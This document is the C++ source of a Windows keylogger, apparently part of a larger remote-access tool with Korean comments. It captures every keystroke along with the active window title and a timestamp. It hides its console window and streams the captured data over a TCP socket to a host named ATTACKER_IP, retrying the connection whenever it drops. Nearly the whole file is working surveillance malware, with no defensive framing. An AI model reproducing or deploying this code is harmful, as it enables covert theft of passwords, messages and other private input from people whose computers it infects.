#include"main.h"
#define MAX_KEYS 255
#define MAX_NAME 128
#define LOG_FILE "keys.txt"
#define TIMESTAMP_FORMAT "%d.%m.%Y %H:%M"
#define MAX_TIMESTAMP 24

/////////////////////////////////////////////////////////////////////////
class Keys
{

public:
	static bool is_logged(int key);
	static bool is_special(int key);
	static int get_name(int key, char* dest, int len);
	static int get_names(bool* keys, char* dest, int len);
	static bool* get_keyboard();				//
	static bool* get_old_keyboard();			//썼던 키보드값 가져온다
	static void update_keyboard();				//키를 old키로 옮긴다
	static bool was_updated();					//키 검사를 하고 바뀐것이 있을시 반복문 실행
private:
	static bool keyboard[MAX_KEYS], old_keyboard[MAX_KEYS];
	Keys();
	virtual ~Keys();
};
bool Keys::keyboard[MAX_KEYS], Keys::old_keyboard[MAX_KEYS];

bool Keys::is_logged(int key)
{
	return (key != VK_LBUTTON) && (key != VK_RBUTTON) && (key != VK_MBUTTON) &&
		(key != VK_LSHIFT) && (key != VK_RSHIFT) && (key != VK_LCONTROL) &&
		(key != VK_SHIFT) && (key != VK_RCONTROL) && (key != VK_LMENU) && (key != VK_RMENU);

}
bool Keys::is_special(int key)
{

	return (key == VK_CONTROL) || (key == VK_MENU);

}
int Keys::get_name(int key,char *dest,int len)
{
	ZeroMemory(dest, sizeof(len));

	if ((key == VK_LBUTTON) || (key == VK_RBUTTON) || (key == VK_MBUTTON)) {
		sprintf(dest, "[MOUSE%d]", key);
	}
	else if (key == VK_BACK) {
		strcpy(dest, "[BCK]");
	}
	else if (key == VK_RETURN) {
		strcpy(dest, "[RET]");
	}
	else if (key == VK_SHIFT) {
		strcpy(dest, "[SHF]");
	}
	else if (key == VK_CONTROL) {
		strcpy(dest, "[CTRL]");
	}
	else if (key == VK_MENU) {
		strcpy(dest, "[ALT]");
	}
	else if (key == VK_CAPITAL) {
		strcpy(dest, "[CAPS]");
	}
	else if (key == VK_ESCAPE) {
		strcpy(dest, "[ESC]");
	}
	else if (key == VK_SPACE) {
		strcpy(dest, "[SPC]");
	}
	else if (key == VK_LEFT) {
		strcpy(dest, "[LEFT]");
	}
	else if (key == VK_UP) {
		strcpy(dest, "[UP]");
	}
	else if (key == VK_RIGHT) {
		strcpy(dest, "[RIGHT]");
	}
	else if (key == VK_DOWN) {
		strcpy(dest, "[DOWN]");
	}
	else if ((0x30 <= key) && (key <= 0x39)) { // 0-9
		sprintf(dest, "%d", key - 0x30);
	}
	else if ((0x41 <= key) && (key <= 0x5A)) { // A-Z
		bool isUpper = GetKeyState(VK_CAPITAL) ? !GetAsyncKeyState(VK_SHIFT) : GetAsyncKeyState(VK_SHIFT);
		if (isUpper) {
			sprintf(dest, "%c", 'A' - 0x41 + key);
		}
		else {
			sprintf(dest, "%c", 'a' - 0x41 + key);
		}
	}
	else if ((VK_NUMPAD0 <= key) && (key <= VK_NUMPAD9)) {
		sprintf(dest, "[NUM%d]", key - VK_NUMPAD0);
	}
	else {
		sprintf(dest, "[KEY:%d]", key);
	}
	return len;


}
int Keys::get_names(bool* keys, char* dest, int len) {
	// TODO: Use len parameter.
	ZeroMemory(dest, MAX_NAME);
	strcat(dest, "<");
	char* key_name = new char[MAX_NAME];
	int j;
	for (j = MAX_KEYS - 1; !keys[j] && j != 0; --j);
	for (int i = 0; i != j; ++i) {
		if (keys[i]) {
			get_name(i, key_name, MAX_NAME);
			strcat(dest, key_name);
			strcat(dest, " + ");
		}
	}
	get_name(j, key_name, MAX_NAME);
	strcat(dest, key_name);
	free(key_name);
	strcat(dest, ">");
	return len;
}

bool* Keys::get_keyboard() {
	for (int i = 0; i != MAX_KEYS; ++i) {
		if (is_logged(i)) {
			keyboard[i] = GetAsyncKeyState(i) & 0x8000 ? true : false;
		}
	}
	return keyboard;
}

bool* Keys::get_old_keyboard() {
	return old_keyboard;
}

bool Keys::was_updated() {
	for (int i = 0; i != MAX_KEYS; ++i) {
		if (keyboard[i] != old_keyboard[i]) {
			return true;
		}
	}
	return false;
}

void Keys::update_keyboard() {
	memcpy(old_keyboard, keyboard, sizeof(bool) * MAX_KEYS);
}







/////////////////////////////////////////////////////////////////////////////////



class Logger
{

public:
	static int log(SOCKET ssock,char* keys);
private:
	static char* last_title, * last_timestamp;
	Logger();
	virtual ~Logger();
	static int get_timestamp(char* dest, int len);
	static int get_title(char*& dest, int len);

};
char* Logger::last_title = NULL, * Logger::last_timestamp = NULL;
int Logger::get_timestamp(char* dest, int len) {
	memset(dest, 0, len);
	time_t rawtime;
	struct tm* timeinfo;
	time(&rawtime);
	timeinfo = localtime(&rawtime);
	strftime(dest, len, TIMESTAMP_FORMAT, timeinfo);
	return len;
}

int Logger::get_title(char*& dest, int len) {
	HWND hwnd = GetForegroundWindow();
	if (dest == NULL) {
		len = GetWindowTextLength(hwnd) + 1;
		dest = (char*)malloc(sizeof(char) * len);
	}
	memset(dest, 0, sizeof(char) * len);
	GetWindowTextA(hwnd, dest, len);
	return len;
}

int Logger::log(SOCKET ssock,char* keys) {


	
		char* timestamp =new char[MAX_TIMESTAMP], * title = NULL;
		get_timestamp(timestamp, MAX_TIMESTAMP);
		get_title(title, 0);

		bool update = (last_title == NULL) ? true : ((strcmp(last_title, title) != 0) ? true : false);
		if (update) {
			free(last_title);
			last_title = title;
			
			CStringA str;
			str.Format("\n%s", last_title);
			int size = str.GetLength();
			if (send(ssock, (char*)&size, 4, 0) == SOCKET_ERROR)
				return -2;//여기 예외처리해라

			if (send(ssock, str.GetString(), str.GetLength(), 0) == SOCKET_ERROR)
				return -2;//여기도

		}
		else {
			free(title);
		}

		if (!update) {
			update = (last_timestamp == NULL) ? true : ((strcmp(last_timestamp, timestamp) != 0) ? true : false);
		}
		if (update) {
			free(last_timestamp);
			last_timestamp = timestamp;
		
			CStringA str;
			str.Format("\n%s", last_timestamp);
			int size=0;
			size = str.GetLength();

			if (send(ssock, (char*)&size, 4, 0) == SOCKET_ERROR)
				return -2;
			if (send(ssock, str.GetString(), str.GetLength(), 0) == SOCKET_ERROR)
				return -2;

		}
		else {
			free(timestamp);
		}
	
		CStringA key_name;
		key_name.Format("%s", keys);
		int sizes = key_name.GetLength();
		if (send(ssock, (char*)&sizes, 4, 0) == SOCKET_ERROR)
			return -2;

		if (send(ssock, key_name.GetString(), sizes, 0) == SOCKET_ERROR)
			return -2;
		

	return 0;
}










//////////////////////////////////////////////////////////////////////////////////////////
void stealth(bool init = false)
{

	if (init)
	{
		HWND stealth;
		AllocConsole();
		stealth = FindWindowA("ConsoleWindowClass", NULL);
		ShowWindow(stealth, false);
	}

}


int keylogger()
{
	
	SOCKET ssock;
	SOCKADDR_IN saddr = { 0, };
	WSAEVENT sevent;
	
	ssock = socket(AF_INET, SOCK_STREAM, 0);
	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = inet_addr(ATTACKER_IP);
	saddr.sin_port = htons(KEYLOGGER_TRANS);

	sevent = WSACreateEvent();
	WSAEventSelect(ssock, sevent, FD_CONNECT);

	while (connect(ssock, (LPSOCKADDR)&saddr, sizeof(saddr)) == SOCKET_ERROR) 
	{
		if (WSAGetLastError() == WSAEISCONN)
			break;

		cout << "connecting....." << endl;
		Sleep(1000);
	}
	
	while (true)
	{
		DWORD dwret = MsgWaitForMultipleObjects(1, &sevent, FALSE, INFINITE, QS_POSTMESSAGE);
		if (dwret == WAIT_FAILED)
		{
			cout << "waitFalse" << endl;
			
		}
		if (dwret == WAIT_OBJECT_0 + 1)
			break;

		WSANETWORKEVENTS ne;
		WSAEnumNetworkEvents(ssock, sevent, &ne);
		
		
		if (ne.lNetworkEvents & FD_CONNECT) 
		{
			int errcode = ne.iErrorCode[FD_CONNECT_BIT];
			

			if (errcode != 0) 
			{
				cout << "keylogger down" << endl;
				goto $connect;
			}

			sevent = WSACreateEvent();
			WSAEventSelect(ssock, sevent, FD_WRITE | FD_CLOSE);
			continue;
		}

		if (ne.lNetworkEvents & FD_WRITE) 
		{

			int errcode = ne.iErrorCode[FD_WRITE_BIT];
			if (errcode != 0) 
			{
				cout << "FD_WRITE ERROR" << endl;
				goto $connect;
			}

			while (1) {
				bool* status = Keys::get_keyboard(), * old_status = Keys::get_old_keyboard();
				if (Keys::was_updated())
				{
					int special = 0, ordinary = 0;

					for (int i = 0; i != MAX_KEYS; ++i)
					{
						if (status[i])
						{
							if (Keys::is_special(i))
							{
								++special;
							}
							else
							{
								++ordinary;
							}
						}
					}
					if ((special != 0) && (ordinary != 0))
					{
						char* key_name = new char[MAX_NAME];
						Keys::get_names(status, key_name, MAX_NAME);
						if (Logger::log(ssock, key_name) == -2)
							goto $connect;
					}
					else
					{
						for (int i = 0; i != MAX_KEYS; ++i)
						{
							if ((status[i]) && (!old_status[i]))
							{
								char* key_name = new char[MAX_NAME];
								Keys::get_name(i, key_name, MAX_NAME);
								if (Logger::log(ssock, key_name) == -2)
									goto $connect;
								
								/*if (send(ssock, (char*)&size, 4, 0)==SOCKET_ERROR)
									goto $connect;

								if (send(ssock, key_name, strlen(key_name), 0) == SOCKET_ERROR)
									goto $connect;*/
								
								delete[] key_name;

							}
						}
					}
					
				}
				Keys::update_keyboard();
				Sleep(5);
			}
			
			continue;
		}

		if (ne.lNetworkEvents & FD_CLOSE) 
		{
		$connect:
		$exit:
			if (ssock)
				closesocket(ssock);
			if (sevent)
				CloseHandle(sevent);

			sevent = WSACreateEvent();
			WSAEventSelect(ssock, sevent, FD_CONNECT);
			if((ssock = socket(AF_INET, SOCK_STREAM, 0))==INVALID_SOCKET) 
			{
				cout << "keylogger socket Error" << endl;
				goto $connect;
			}

			while (connect(ssock, (LPSOCKADDR)&saddr, sizeof(saddr)) == SOCKET_ERROR)
			{
				if (WSAGetLastError() == WSAEISCONN)
					break;
				cout << "connecting...." << endl;
				Sleep(1000);
				
			}
		}

	}


	return 0;
}